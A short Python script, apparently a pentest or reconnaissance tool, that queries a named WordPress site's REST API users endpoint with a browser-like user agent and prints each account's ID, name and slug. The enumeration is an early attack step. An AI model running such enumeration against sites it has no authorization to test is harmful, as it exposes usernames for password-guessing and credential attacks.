import requests

TARGET_URL = "https://www.supercinebattle-test.fr"
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

def enumerate_users_via_api():
    api_url = f"{TARGET_URL}/wp-json/wp/v2/users"
    print(f"[*] Test de l'API REST : {api_url}\n")
    try:
        response = requests.get(api_url, headers=HEADERS, timeout=10)
        if response.status_code == 200:
            users = response.json()
            if users:
                print("[+] API ouverte. Utilisateurs :")
                for u in users:
                    print(f"    - ID: {u.get('id')} | Nom: {u.get('name')} | Slug: {u.get('slug')}")
            else:
                print("[-] API accessible mais liste vide.")
        elif response.status_code in [401, 403]:
            print(f"[-] ACCÈS REFUSÉ ({response.status_code}).")
    except Exception as e:
        print(f"[!] Erreur : {e}")

if __name__ == "__main__":
    enumerate_users_via_api()